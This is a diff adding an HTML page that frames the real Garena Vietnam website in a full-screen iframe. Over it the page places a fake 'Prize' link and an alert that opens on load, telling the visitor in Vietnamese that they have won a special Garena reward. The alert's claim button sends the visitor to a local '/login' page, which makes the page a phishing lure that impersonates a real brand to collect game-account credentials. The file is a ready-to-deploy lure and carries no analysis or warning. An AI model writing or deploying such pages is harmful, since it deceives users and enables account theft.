@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena</title>
+    <style>
+        body {
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            font: 16px/1.7 Open Sans, arial, Helvetica Neue, Helvetica;
+        }
+
+        iframe {
+            border: none;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1;
+        }
+
+        #customAlert {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 400px;
+            max-width: 90%;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            z-index: 10;
+            animation: fadeIn 0.5s;
+            border-top: 4px solid #d9534f;
+        }
+
+        #closeBtn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 24px;
+            height: 24px;
+            background-color: #d9534f;
+            color: white;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 16px;
+            line-height: 24px;
+            text-align: center;
+            text-decoration: none;
+        }
+
+        #closeBtn:hover {
+            background-color: #b52e2a;
+        }
+
+        #customAlert h2 {
+            margin: 0;
+            font-size: 22px;
+            color: #d9534f;
+        }
+
+        #customAlert p {
+            font-size: 16px;
+            color: #333;
+            margin: 15px 0;
+        }
+
+        #customAlert button {
+            padding: 12px 30px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+
+        #customAlert button:hover {
+            background-color: #0056b3;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .alertPrize {
+            text-decoration: none;
+            color: #333538;
+            font: inherit;
+            position: absolute;
+            top: 19px;
+            right: 819px;
+            font-size: 14px;
+            font-weight: lighter;
+            z-index: 1;
+            transition: opacity 0.3s ease;
+        }
+
+        .alertPrize:hover {
+            opacity: 0.5;
+        }
+    </style>
+</head>
+
+<body>
+
+    <iframe src="https://www.garena.vn/"></iframe>
+    <a href="#" class="alertPrize" onclick="showAlert()">Prize</a>
+
+    <div id="overlay"></div>
+
+    <div id="customAlert">
+        <a id="closeBtn" href="#" onclick="closeAlert()">×</a>
+        <h2>Chúc Mừng Bạn!</h2>
+        <p>Bạn vừa nhận được một phần thưởng đặc biệt từ Garena!</p>
+        <button onclick="claimReward()">Nhận Thưởng</button>
+    </div>
+
+    <script>
+        window.onload = function () {
+            showAlert();
+        };
+
+        function showAlert() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('customAlert').style.display = 'block';
+        }
+
+        function closeAlert() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('customAlert').style.display = 'none';
+        }
+
+        function claimReward() {
+            window.location.href = '/login';
+        }
+
+        document.getElementById('overlay').addEventListener('click', function (event) {
+            event.stopPropagation();
+        });
+    </script>
+</body>
+
+</html>
